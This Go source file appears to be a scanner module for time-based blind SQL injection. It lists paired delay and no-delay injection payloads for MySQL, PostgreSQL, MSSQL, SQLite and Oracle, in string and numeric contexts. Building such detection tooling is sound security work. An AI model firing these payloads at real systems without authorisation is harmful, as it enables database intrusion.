package sqli_time_blind

// timePair represents a sleep/no-sleep payload pair for time-based blind SQLi testing.
type timePair struct {
	context  string // "string", "numeric", "bypass"
	dbType   string // "mysql", "postgres", "mssql", "sqlite", "oracle"
	sleepVal string // causes delay
	noSleep  string // no delay (same structure)
}

// stringPayloads are payloads for string context injection points.
var stringPayloads = []timePair{
	// MySQL
	{context: "string", dbType: "mysql", sleepVal: "' OR SLEEP(3)--", noSleep: "' OR SLEEP(0)--"},
	{context: "string", dbType: "mysql", sleepVal: "' AND SLEEP(3)--", noSleep: "' AND SLEEP(0)--"},
	// PostgreSQL
	{context: "string", dbType: "postgres", sleepVal: "'; SELECT pg_sleep(3)--", noSleep: "'; SELECT pg_sleep(0)--"},
	{context: "string", dbType: "postgres", sleepVal: "' OR (SELECT pg_sleep(3))::text='1'--", noSleep: "' OR (SELECT pg_sleep(0))::text='1'--"},
	// MSSQL
	{context: "string", dbType: "mssql", sleepVal: "'; WAITFOR DELAY '0:0:3'--", noSleep: "'; WAITFOR DELAY '0:0:0'--"},
	{context: "string", dbType: "mssql", sleepVal: "' OR 1=1; WAITFOR DELAY '0:0:3'--", noSleep: "' OR 1=1; WAITFOR DELAY '0:0:0'--"},
	// SQLite
	{context: "string", dbType: "sqlite", sleepVal: "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))--", noSleep: "' AND 1=1--"},
	// Oracle
	{context: "string", dbType: "oracle", sleepVal: "' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3)--", noSleep: "' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',0)--"},
}

// numericPayloads are payloads for numeric context injection points.
var numericPayloads = []timePair{
	// MySQL
	{context: "numeric", dbType: "mysql", sleepVal: " OR SLEEP(3)--", noSleep: " OR SLEEP(0)--"},
	{context: "numeric", dbType: "mysql", sleepVal: " AND SLEEP(3)--", noSleep: " AND SLEEP(0)--"},
	// PostgreSQL
	{context: "numeric", dbType: "postgres", sleepVal: "; SELECT pg_sleep(3)--", noSleep: "; SELECT pg_sleep(0)--"},
	// MSSQL
	{context: "numeric", dbType: "mssql", sleepVal: "; WAITFOR DELAY '0:0:3'--", noSleep: "; WAITFOR DELAY '0:0:0'--"},
	// SQLite
	{context: "numeric", dbType: "sqlite", sleepVal: " AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))--", noSleep: " AND 1=1--"},
	// Oracle
	{context: "numeric", dbType: "oracle", sleepVal: " OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3)--", noSleep: " OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',0)--"},
}

// getPayloadsForValue selects appropriate payloads based on the parameter's base value.
func getPayloadsForValue(baseValue string) []timePair {
	if isNumericValue(baseValue) {
		return numericPayloads
	}
	return stringPayloads
}

// isNumericValue checks if a string looks like a number.
func isNumericValue(s string) bool {
	if s == "" {
		return false
	}
	for i, c := range s {
		if c == '-' && i == 0 {
			continue
		}
		if c == '.' {
			continue
		}
		if c < '0' || c > '9' {
			return false
		}
	}
	return true
}
